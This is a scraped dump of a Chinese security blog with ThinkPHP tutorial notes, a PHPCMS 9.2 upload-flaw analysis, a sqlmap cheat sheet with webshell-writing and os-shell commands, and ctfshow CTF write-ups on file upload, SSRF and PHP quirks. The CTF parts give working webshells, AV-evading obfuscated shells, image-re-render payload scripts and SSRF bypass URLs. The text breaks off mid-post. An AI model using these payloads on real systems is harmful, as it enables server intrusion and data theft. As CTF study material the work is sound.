&#39;desc&#39;)-&gt;find() 除了查询方法可以使用链式连贯操作，CURD 操作也可以使用（后续课程研究）； 那么，有多少种类似 where()的链式操作方法呢？打开手册瞄一下。。。 二．更多查询 如果多次使用数据库查询，那么每次静态创建都会生成一个实例，造成浪费； 我们可以把对象实例保存下来，再进行反复调用即可； $userQuery = Db::name(&#39;user&#39;); $dataFind = $userQuery-&gt;where(&#39;id&#39;, 27)-&gt;find(); $dataSelect = $userQuery-&gt;select(); 当同一个对象实例第二次查询后，会保留第一次查询的值； $data1 = $userQuery-&gt;order(&#39;id&#39;, &#39;desc&#39;)-&gt;select(); $data2 = $userQuery-&gt;select(); return Db::getLastSql(); SELECT * FROM tp_user ORDER BY id DESC 使用 removeOption()方法，可以清理掉上一次查询保留的值； $userQuery-&gt;removeOption(&#39;where&#39;)-&gt;select(); 0x0a数据库的数据新增一．单数据新增 使用 insert()方法可以向数据表添加一条数据，更多的字段采用默认； $data = [ ‘username’ =&gt; ‘辉夜’, ‘password’ =&gt; ‘123’, ‘gender’ =&gt; ‘女’, ‘email’ =&gt; &#39;huiye@163.com‘, ‘price’ =&gt; 90, ‘details’ =&gt; ‘123’ ]; Db::name(&#39;user&#39;)-&gt;insert($data); 如果新增成功，insert()方法会返回一个 1 值； return Db::name(&#39;user&#39;)-&gt;insert($data); 如果你添加一个不存在的字段数据，会抛出一个异常 Exception； 如果想强行新增抛弃不存在的字段数据，则使用 strick(false)方法，忽略异常； Db::name(&#39;user&#39;)-&gt;strict(false)-&gt;insert($data); 如果我们采用的数据库是 mysql，可以支持 replace 写入； insert 和 replace 写入的区别，前者表示表中存在主键相同则报错，后者则修改； Db::name(&#39;user&#39;)-&gt;replace()-&gt;insert($data); return Db::getLastSql(); 使用 insertGetId()方法，可以在新增成功后返回当前数据 ID； return Db::name(&#39;user&#39;)-&gt;insertGetId($data); 二．批量数据新增 使用 insertAll()方法，可以批量新增数据，但要保持数组结构一致； $data = [ [ ‘username’ =&gt; ‘辉夜’, ‘password’ =&gt; ‘123 ‘gender’ =&gt; ‘女’, ‘email’ =&gt; &#39;huiye@163.com‘, ‘price’ =&gt; 90, ‘details’ =&gt; ‘123’ ], [ ‘username’ =&gt; ‘辉夜’, ‘password’ =&gt; ‘123’, ‘gender’ =&gt; ‘女’, ‘email’ =&gt; &#39;huiye@163.com‘, ‘price’ =&gt; 90, ‘details’ =&gt; ‘123’ ] ]; Db::name(&#39;user&#39;)-&gt;insertAll($data); 批量新增也支持 replace()方法，添加后改变成 replace into； Db::name(&#39;user&#39;)-&gt;replace()-&gt;insertAll($data); 三．save()新增 save()方法是一个通用方法，可以自行判断是新增还是修改(更新)数据； save()方法判断是否为新增或修改的依据为，是否存在主键，不存在即新增； Db::name(&#39;user&#39;)-&gt;save($data); 0x0b数据库的修改删除一．数据修改 使用 update()方法来修改数据，修改成功返回影响行数，没有修改返回 0； $data = [ ‘username’ =&gt; ‘李白’ ]; return Db::name(‘user’)-&gt;where(‘id’, 38)-&gt;update($data); 如果修改数据包含了主键信息，比如 id，那么可以省略掉 where 条件； $data = [ ‘id’ =&gt; 231, ‘username’ =&gt; ‘李白’ ]; return Db::name(‘user’)-&gt;update($data); 如果想让一些字段修改时执行 SQL 函数操作，可以使用 exp()方法实现； Db::name(‘user’)-&gt;where(‘id’, 232) -&gt;exp(‘email’, ‘UPPER(email)’) -&gt;update(); 如果要自增/自减某个字段，可以使用 inc/dec 方法，并支持自定义步长； Db::name(‘user’)-&gt;where(‘id’, 232) -&gt;inc(‘price’) -&gt;dec(‘status’, 2) -&gt;update(); 一个更加简单粗暴灵活的方式，使用::raw()方法实现 3，4 点的内容； Db::name(‘user’)-&gt;where(‘id’, 232) -&gt;update([ ‘email’ =&gt; Db::raw(‘UPPER(email)’), ‘price’ =&gt; Db::raw(‘price + 1’), ‘status’ =&gt; Db::raw(‘status - 2’) ]); 使用 save()方法进行修改数据，这里必须指定主键才能实现修改功能； Db::name(‘user’)-&gt;where(‘id’, 232) -&gt;save([‘username’=&gt;’李黑’]); 0x0c数据库的查询表达式一．比较查询 查询表达式支持大部分常用的 SQL 语句，语法格式如下： where(‘字段名’,’查询表达式’,’查询条件’); 在查询数据进行筛选时，我们采用 where()方法，比如 id=80； Db::name(‘user’)-&gt;where(‘id’, 80)-&gt;find(); Db::name(‘user’)-&gt;where(‘id’,’=’,80)-&gt;find(); 使用&lt;&gt;、&gt;、&lt;、&gt;=、&lt;=可以筛选出各种符合比较值的数据列表； Db::name(‘user’)-&gt;where(‘id’,’&lt;&gt;’,80)-&gt;select(); 二．区间查询 使用 like 表达式进行模糊查询； Db::name(‘user’)-&gt;where(‘email’,’like’,’xiao%’)-&gt;select(); like 表达式还可以支持数组传递进行模糊查询； Db::name(‘user’)-&gt;where(‘email’,’like’,[‘xiao%’,’wu%’], ‘or’)-&gt;select(); SELECT * FROM tp_user WHERE (email LIKE ‘xiao%’ OR email LIKE ‘wu%’) like 表达式具有两个快捷方式 whereLike()和 whereNoLike()； Db::name(‘user’)-&gt;whereLike(‘email’,’xiao%’)-&gt;select(); Db::name(‘user’)-&gt;whereNotLike(‘email’,’xiao%’)-&gt;select(); between 表达式具有两个快捷方式 whereBetween()和 whereNotBetween()； Db::name(‘user’)-&gt;where(‘id’,’between’,’19,25’)-&gt;select(); Db::name(‘user’)-&gt;where(‘id’,’between’,[19, 25])-&gt;select(); Db::name(‘user’)-&gt;whereBetween(‘id’,’19,25’)-&gt;select(); Db::name(‘user’)-&gt;whereNotBetween(‘id’,’19,25’)-&gt;select(); in 表达式具有两个快捷方式 whereIn()和 whereNotIn()； Db::name(‘user’)-&gt;where(‘id’,’in’, ‘19,21,29’)-&gt;select(); Db::name(‘user’)-&gt;where(‘id’,’in’, [19, 21, 29])-&gt;select(); Db::name(‘user’)-&gt;whereIn(‘id’,’19,21,29’)-&gt;select(); Db::name(‘user’)-&gt;whereNotIn(‘id’,’19,21,29’)-&gt;select(); null 表达式具有两个快捷方式 whereNull()和 whereNotNull()； Db::name(‘user’)-&gt;where(‘uid’,’null’)-&gt;select(); Db::name(‘user’)-&gt;where(‘uid’,’not null’)-&gt;select(); Db::name(‘user’)-&gt;whereNull(‘uid’)-&gt;select(); Db::name(‘user’)-&gt;whereNotNull(‘uid’)-&gt;select(); 三．EXP 查询 使用 exp 可以自定义字段后的 SQL 语句； Db::name(‘user’)-&gt;where(‘id’,’exp’,’IN (19,21,25)’)-&gt;select(); Db::name(‘user’)-&gt;whereExp(‘id’,’IN (19,21,25)’)-&gt;select() 0x0d数据库的时间查询一．传统方式 可以使用&gt;、&lt;、&gt;=、&lt;=来筛选匹配时间的数据； Db::name(‘user’)-&gt;where(‘create_time’, ‘&gt;’, ‘2018-1-1’)-&gt;select(); 可以使用 between 关键字来设置时间的区间； Db::name(‘user’)-&gt;where(‘create_time’, ‘between’, [‘2018-1-1’, ‘2019-12-31’])-&gt;select(); Db::name(‘user’)-&gt;where(‘create_time’, ‘not between’, [‘2018-1-1’, ‘2019-12-31’])-&gt;select(); 二．快捷方式 时间查询的快捷方法为 whereTime()，直接使用&gt;、&lt;、&gt;=、&lt;=； Db::name(‘user’)-&gt;whereTime(‘create_time’, ‘&gt;’, ‘2018-1-1’)-&gt;select(); 快捷方式也可以使用 between 和 not between； Db::name(‘user’)-&gt;whereBetween(‘create_time’, [‘2018-1-1’, ‘2019-12-31’])-&gt;select(); 还有一种快捷方式为：whereBetweenTime()和 whereNotBetweenTime()； Db::name(‘user’)-&gt;whereBetweenTime(‘create_time’, ‘2018-1-1’, ‘2019-12-31’)-&gt;select(); 默认的大于&gt;，可以省略； Db::name(‘user’)-&gt;whereTime(‘create_time’, ‘2018-1-1’)-&gt;select(); 三．固定查询 使用 whereYear 查询今年的数据、去年的数据和某一年的数据 Db::name(‘user’)-&gt;whereYear(‘create_time’)-&gt;select(); Db::name(‘user’)-&gt;whereYear(‘create_time’, ‘last year’)-&gt;select(); Db::name(‘user’)-&gt;whereYear(‘create_time’, ‘2016’)-&gt;select(); 使用 whereMonth 查询当月的数据、上月的数据和某一个月的数据； Db::name(‘user’)-&gt;whereMonth(‘create_time’)-&gt;select(); Db::name(‘user’)-&gt;whereMonth(‘create_time’, ‘last month’)-&gt;select(); Db::name(‘user’)-&gt;whereMonth(‘create_time’, ‘2016-6’)-&gt;select(); 使用 whereDay 查询今天的数据、昨天的数据和某一个天的数据； Db::name(‘user’)-&gt;whereDay(‘create_time’)-&gt;select(); Db::name(‘user’)-&gt;whereDay(‘create_time’, ‘last day’)-&gt;select(); Db::name(‘user’)-&gt;whereDay(‘create_time’, ‘2016-6-27’)-&gt;select(); 四．其它查询 查询指定时间的数据，比如两小时内的； Db::name(‘user’)-&gt;whereTime(‘create_time’, ‘-2 hours’)-&gt;select(); 查询两个时间字段时间有效期的数据，比如会员开始到结束的期间； Db::name(‘user’)-&gt;whereBetweenTimeField(‘start_time’, ‘end_time’)-&gt;select(); 0x10模型的定义方式一．定义模型 定义一个和数据库表向匹配的模型； class User extends Model 模型会自动对应数据表，并且有一套自己的命名规则； 模型类需要去除表前缀(tp_)，采用驼峰式命名，并且首字母大写； tp_user(表名) =&gt; User tp_user_type(表名) =&gt; UserType 创建空模型后，我们可以在控制器调用，创建控制器 DataModel.php； 可以直接使用模型的名称 User::*调用查询方法，比如 select()等； 如果没有代码提示，请和上一节一样，把 5.1 的注释复制过来； class DataModel { public function index() { return json(User::**select**()); } } 如果担心设置的模型类名和 PHP 关键字冲突，可以开启应用类后缀； 比如设置：Class UserModel 这种，需要更改文件名为 UserModel.php； 然后设置一下$name 属性为指定 user(表名)即可实现； class UserModel extends Model { protected $name = &#39;user&#39;; } 二．设置模型 默认主键为 id，你可以设置其它主键，比如 uid； protected $pk = ‘uid’; 从控制器端调用模型操作，如果和控制器类名重复，可以设置别名； use app\\model\\User as UserModel; 在模型定义中，可以设置其它的数据表； protected $table = ‘tp_one’; 模型和控制器一样，也有初始化，在这里必须设置 static 静态方法； //模型初始化 protected static function init() { //第一次实例化的时候执行 init echo &#39;初始化 User 模型&#39;; }","categories":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://pp1ove.gitee.io/categories/thinkphp/"}],"tags":[{"name":"开发框架","slug":"开发框架","permalink":"https://pp1ove.gitee.io/tags/开发框架/"}],"keywords":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://pp1ove.gitee.io/categories/thinkphp/"}]},{"title":"phpcms9.2文件上传漏洞","slug":"phpcms9-2文件上传漏洞","date":"2021-02-02T08:34:49.000Z","updated":"2021-02-02T08:59:32.029Z","comments":false,"path":"2021/02/02/phpcms9-2文件上传漏洞/","link":"","permalink":"https://pp1ove.gitee.io/2021/02/02/phpcms9-2文件上传漏洞/","excerpt":"","text":"前端操作 这里在前端,会将我们的头像分成四个大小，打包成一个压缩包,然后交给后台处理 后端代码 /** * 上传头像处理 * 传入头像压缩包，解压到指定文件夹后删除非图片文件 */ public function uploadavatar() { //根据用户id创建文件夹 if(isset($this-&gt;data[&#39;uid&#39;]) &amp;&amp; isset($this-&gt;data[&#39;avatardata&#39;])) { //avatardata为文件内容 $this-&gt;uid = $this-&gt;data[&#39;uid&#39;]; $this-&gt;avatardata = $this-&gt;data[&#39;avatardata&#39;]; } else { exit(&#39;0&#39;); } $dir1 = ceil($this-&gt;uid / 10000); $dir2 = ceil($this-&gt;uid % 10000 / 1000); //创建图片存储文件夹 $avatarfile = pc_base::load_config(&#39;system&#39;, &#39;upload_path&#39;).&#39;avatar/&#39;; $dir = $avatarfile.$dir1.&#39;/&#39;.$dir2.&#39;/&#39;.$this-&gt;uid.&#39;/&#39;; if(!file_exists($dir)) { mkdir($dir, 0777, true); } //存储flashpost图片 $filename = $dir.$this-&gt;uid.&#39;.zip&#39;; file_put_contents($filename, $this-&gt;avatardata); //$filename=1.zip //解压缩文件 pc_base::load_app_class(&#39;pclzip&#39;, &#39;phpsso&#39;, 0); $archive = new PclZip($filename); if ($archive-&gt;extract(PCLZIP_OPT_PATH, $dir) == 0) { die(&quot;Error : &quot;.$archive-&gt;errorInfo(true)); } //判断文件安全，删除压缩包和非jpg图片 $avatararr = array(&#39;180x180.jpg&#39;, &#39;30x30.jpg&#39;, &#39;45x45.jpg&#39;, &#39;90x90.jpg&#39;); if($handle = opendir($dir)) { //打开文件保存目录 while(false !== ($file = readdir($handle))) { //列出该目录下的文件,$file为文件名数组 if($file !== &#39;.&#39; &amp;&amp; $file !== &#39;..&#39;) { if(!in_array($file, $avatararr)) { //如果文件名不合法,则删除文件 @unlink($dir.$file); //@unlink 无法删除文件夹 } else { $info = @getimagesize($dir.$file); //返回图片信息 if(!$info || $info[2] !=2) { @unlink($dir.$file); } } } } closedir($handle); } $this-&gt;db-&gt;update(array(&#39;avatar&#39;=&gt;1), array(&#39;uid&#39;=&gt;$this-&gt;uid)); exit(&#39;1&#39;); } 因为这个方法没有进行递归查询,readdir()只能列出该目录下的文件,但是删除文件它用的是@unlink(),@unlink 无法删除文件夹，所以说若我们通过抓包,将压缩包内容修改为一个kali文件夹,里面存放1.php木马,这串代码无法删除kali文件,也没有递归检测我们的1.php文件,导致我们就可以使我们的恶意文件成功上传","categories":[{"name":"cms","slug":"cms","permalink":"https://pp1ove.gitee.io/categories/cms/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://pp1ove.gitee.io/tags/文件上传/"}],"keywords":[{"name":"cms","slug":"cms","permalink":"https://pp1ove.gitee.io/categories/cms/"}]},{"title":"sqlmap","slug":"sqlmap","date":"2021-01-29T11:58:30.000Z","updated":"2021-02-18T10:37:06.493Z","comments":false,"path":"2021/01/29/sqlmap/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/29/sqlmap/","excerpt":"","text":"功能介绍1.dump数据 2.读写文件 3.绕web防火墙（waf） 4.SqlMapAPI 支持的注入类型1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 4、联合查询注入，可以使用union的情况下的注入。（适合用于通过循环直接输出联合查询结果，否则只会显示第一项结果） 5、堆查询注入，可以同时执行多条语句的执行时的注入。 相关命令-u &quot;&quot; #测试是否有注入 -u &quot;&quot; --current-db #查看当前数据库 -u &quot;&quot; -D dbname --tables #查看所有表 -u &quot;&quot; -D dbname -T tablename --columns #查字段 -u &quot;&quot; -D dbname -T tablename -C id,name,passwd --dump#查数据 -u &quot;&quot; --cookie=&quot;PHPSESSID=613DAD.....&quot; #使用cookie -u &quot;&quot; --file-read=&quot;C:\\phpStudy\\www\\index.php&quot; #读取铭感文件，需要用绝对路径 -u &quot;&quot; --file-write=&quot;./shell.php&quot; --file-dest &quot;C:\\phpStudy\\www\\a.php&quot; #写webshell -u &quot;&quot; --data &quot;uname=1&amp;passwd&quot; #post注入 -u &quot;&quot; --os-shell #获取shell -u &quot;&quot; --sql-shell --no-cast #获取数据库权限 SqlMapAPI python sqlmapapi.py -s -h -p","categories":[{"name":"工具","slug":"工具","permalink":"https://pp1ove.gitee.io/categories/工具/"}],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://pp1ove.gitee.io/tags/sqlmap/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"https://pp1ove.gitee.io/categories/工具/"}]},{"title":"ctfshow-文件上传","slug":"ctfshow-文件上传","date":"2021-01-29T07:02:05.000Z","updated":"2021-02-07T13:50:29.116Z","comments":false,"path":"2021/01/29/ctfshow-文件上传/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/29/ctfshow-文件上传/","excerpt":"","text":"151关闭浏览器js 或者抓包修改成一句话 152上传 1.php然后抓包修改content-type为 image/png或者上传.png文件后修改后缀为.php 153https://www.dazhuanlan.com/2020/03/08/5e641cbc397c2/ 发现很容易上传如php5,phtml等类型文件,但是不解析.通过插件识别为nginx服务器,尝试上传.user.ini,发现上传成功 文件内容: auto_prepend_file = 1.php 1 然后上传一张图片马,1.php 内容: phpinfo(); @eval($_POST[&#39;hacker&#39;]); 12 然后访问 /upload/index.php 154先上传.user.ini,再上传图片马,再访问/upload/index.php 在前面一题的基础上增加了内容过滤,过滤了php , 可以用大小写来绕过 尝试使用短标签绕过 对于php的标签其他写法，我们这里多说几种 1、 &lt;? echo &#39;123&#39;;?&gt; 前提是开启配置参数short_open_tags=on 2、 &lt;?=(表达式)?&gt; 等价于 &lt;?php echo (表达式)?&gt; 不需要开启参数设置 3、 &lt;% echo &#39;123&#39;;%&gt; 前提是开启配置参数asp_tags=on，经过测试发现7.0及以上修改完之后也不能使用，而是报500错误，但是7.0以下版本在修改完配置后就可以使用了。 4、 &lt;script language=”php”&gt;echo &#39;123&#39;; &lt;/script&gt; 1 不需要修改参数开关，但是只能在7.0以下可用。 对于该题，我们可用使用&lt;?=(表达式)?&gt;进行绕过，图片内容 &lt;?=eval($_POST[1]);?&gt; 155 文件内容过滤php测试正常的 png 图片可以上传。 对图片内容过滤php 大小写不能绕过了 绕过 &lt;?=eval($_POST[&#39;a&#39;]); 156过滤 php, [测试，又是文件内容过滤了 php. 紧接着发现事情没这么简单，还过滤了[，这给传参造成了一定的困难。 但是我们可以直接 &lt;?=system(&#39;cat ../flag.???&#39;); &lt;?=eval($_POST{&#39;a&#39;}); # 用 {} 代替 [] 157-158过滤; php [] {}eval用不了了 直接 &lt;?=system(&#39;ls ../&#39;)?&gt; &lt;?=system(&#39;cat ../*&#39;)?&gt; 159 又过滤()无法使用函数,使用 160 过滤 包含日志文件过滤了括号反引号还有一些关键字 利用日志包含绕过，图片内容&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;因为log被过滤了。所以用拼接绕过 上传完.user.ini和图片后 访问网站然后修改ua头信息 接着访问/upload即可拿到flag 161在160的基础上增加图片头即可，即 GIF89A 162-163 包含session文件https://www.freebuf.com/vuls/202819.html 首先上传.user.ini 然后进行条件竞争 另外一边一直访问upload/index.php 164 二次渲染二次渲染原理 : https://www.fujieace.com/penetration-test/upload-labs-pass-16.html PNG图片马脚本: &lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,&#39;2.png&#39;); //要修改的图片的路径 /* 木马内容 &lt;?$_GET[0]($_POST[1]);?&gt; */ ?&gt; 然后会在当前目录下生成一个图片马 165 二次渲染 jpg&lt;?php $miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;; if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) { die(&#39;php-gd is not installed&#39;); } if(!isset($argv[1])) { die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;); } set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die(&#39;Incorrect SOI marker&#39;); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) { die(&#39;Success!&#39;); } else { break; } } } } unlink(&#39;payload_&#39;.$argv[1]); die(&#39;Something\\&#39;s wrong&#39;); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#39;/(\\d+) extraneous bytes before marker/&#39;, $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = &#39;&#39;; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die(&#39;File not exists [&#39;.$filename.&#39;]&#39;); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die(&#39;End Of File&#39;); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die(&#39;End Of File&#39;); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } } ?&gt; 1、随便找一个jpg图片，先上传至服务器然后再下载到本地保存为 1.jpg ； 2、插入php代码；使用脚本处理1.jpg，命令： php jpg_payload.php 1.jpg 使用16进制编辑器打开，就可以看到插入的php代码； 3、上传图片马；将生成的 payload_1.jpg上传。 4、验证；将上传的图片再次下载到本地，使用16进制编辑器打开。 可以看到，php代码没有被去除，证明我们成功上传了含有php代码的jpg图片。 注意：有一些jpg图片不能被处理，所以要多尝试一些jpg图片。 166前端验证只能上传ZIP文件,然后随便上传一个文件,发现点击下载文件后会包含文件 上传一句话 167 .htaccess抓包测试了一下，是黑名单。 开局有个提示httpd 测试apache解析漏洞没解析。 apache 解析漏洞：https://blog.csdn.net/qq_32434307/article/details/79480316 测试.htaccess成功。 &lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 然后上传带有马的 1.jpg即可。 168-170免杀 &lt;?php $a = &quot;s#y#s#t#e#m&quot;; $b = explode(&quot;#&quot;,$a); $c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5]; $c($_REQUEST[1]); ?&gt; &lt;?php $a=substr(&#39;1s&#39;,1).&#39;ystem&#39;; $a($_REQUEST[1]); ?&gt; &lt;?php $a=strrev(&#39;metsys&#39;); $a($_REQUEST[1]); ?&gt; &lt;?php $a=$_REQUEST[&#39;a&#39;]; $b=$_REQUEST[&#39;b&#39;]; $a($b); ?&gt; 169测试发现 抓包需修改Content-Type: image/png 文件名后缀随意。 看看文件内容过滤了啥 &lt;&gt; ? 等等。 只能进行 .user.ini日志文件包含了。 思路: 上传 .user.ini auto_prepend_file=/var/log/nginx/access.log 然后随便上传个php文件即可。 然后改UA为一句话即可。 170测试上传zip，抓包修改，后缀为php, MIME类型为image/png. 包含.user.ini 日志文件/var/log/nginx/access.log","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://pp1ove.gitee.io/tags/文件上传/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"ctfshow-ssrf","slug":"ctfshow-ssrf","date":"2021-01-28T12:39:17.000Z","updated":"2021-01-29T06:54:48.818Z","comments":false,"path":"2021/01/28/ctfshow-ssrf/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/28/ctfshow-ssrf/","excerpt":"","text":"351&lt;?php error_reporting(0); highlight_file(__FILE__); $url=$_POST[&#39;url&#39;]; $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); ? 352-353&lt;?php error_reporting(0); highlight_file(__FILE__); $url=$_POST[&#39;url&#39;]; $x=parse_url($url); if($x[&#39;scheme&#39;]===&#39;http&#39;||$x[&#39;scheme&#39;]===&#39;https&#39;){ if(!preg_match(&#39;/localhost|127.0.0/&#39;)){ $ch=curl_init($url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo ($result); } else{ die(&#39;hacker&#39;); } } else{ die(&#39;hacker&#39;); } ?&gt; 要求必须是http或https 然后过滤127.0.0.1/localhost 有很多方法 http://2130706433/flag.php 十进制绕过 http://0x7F000001/flag.php http://017700000001/flag.php http://0/flag.php http://127.0.1/flag.php http://127.1/flag.php http://1il88.cn/r6NOs 短网址，没有成功 http://127.0。0。1/flag.php 没有成功 http://127.0.0.① 封闭式字符,没有成功 354搬运一下 DNS-Rebinding攻击绕过 url=http://r.xxxzc8.ceye.io/flag.php 自己去ceye.io注册绑定127.0.0.1然后记得前面加r 302跳转绕过也行，在自己的网站主页加上这个 &lt;?php header(&quot;Location:http://127.0.0.1/flag.php&quot;); 我自己的域名A记录设为了127.0.0.1 或者有个现成的A记录是127.0.0.1的网站 url=http://sudo.cc/flag.php 355-356对host长度进行了限制，host长度小于5 http://0/flag.php 357关键代码，不能是一些私有地址 if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { die(&#39;ip!&#39;); } FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255） FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334） FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1） FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。 用web354说过的DNS-Rebinding与302跳转即可解题 358限制是这个 if(preg_match(&#39;/^http:\\/\\/ctf\\..*show$/i&#39;,$url)){ echo file_get_contents($url); } blackhat议题加上url解析特性php的curl默认是@后面的部分加上?url解析的时候会把他当成url解析的get请求参数 url=http://ctf.@127.0.0.1/flag.php?.show 359-360源码里面有这样一段内容 用gopher协议打mysql 使用gopherus生成payload 将_后面的再次url编码,传入check.php里面 360打redis,不多说,差不多的步骤","categories":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://pp1ove.gitee.io/tags/ssrf/"}],"keywords":[{"name":"技术","slug":"技术","permalink":"https://pp1ove.gitee.io/categories/技术/"}]},{"title":"ctfshow-php特性","slug":"ctfshow-php特性","date":"2021-01-28T03:24:57.000Z","updated":"2021-03-06T13:51:46.168Z","comments":false,"path":"2021/01/28/ctfshow-php特性/","link":"","permalink":"https://pp1ove.gitee.io/2021/01/28/ctfshow-php特性/","excerpt":"","text":"参考链接：https://www.freebuf.com/articles/web/261802.html 89 数组绕过intvalinclude(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if(c(&quot;/[0-9]/&quot;, $num)){ die(&quot;no no no!&quot;); } if(intval($num)){ echo $flag; } } 利用数组绕过 payload:num[]=1 90 intval($num,0)include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num===&quot;4476&quot;){ die(&quot;no no no!&quot;); } if(intval($num,0)===4476){ echo $flag; }else{ echo intval($num,0); } } 使用16进制绕过 91 /m多行匹配show_source(__FILE__); include(&#39;flag.php&#39;); $a=$_GET[&#39;cmd&#39;]; if(preg_match(&#39;/^php$/im&#39;, $a)){ if(preg_match(&#39;/^php$/i&#39;, $a)){ echo &#39;hacker&#39;; } else{ echo $flag; } } else{ echo &#39;nonononono&#39;; } 这里考了一个 /m多行匹配 所以第一个if其实是任意一行满足就行,而第二个if只能匹配第一行 payload：?cmd=%0Aphp 92 intval($num,0) include(&quot;flag.php&quot;); highlight_file(__FILE__); if(isset($_GET[&#39;num&#39;])){ $num = $_GET[&#39;num&#39;]; if($num==4476){ die(&quot;no no 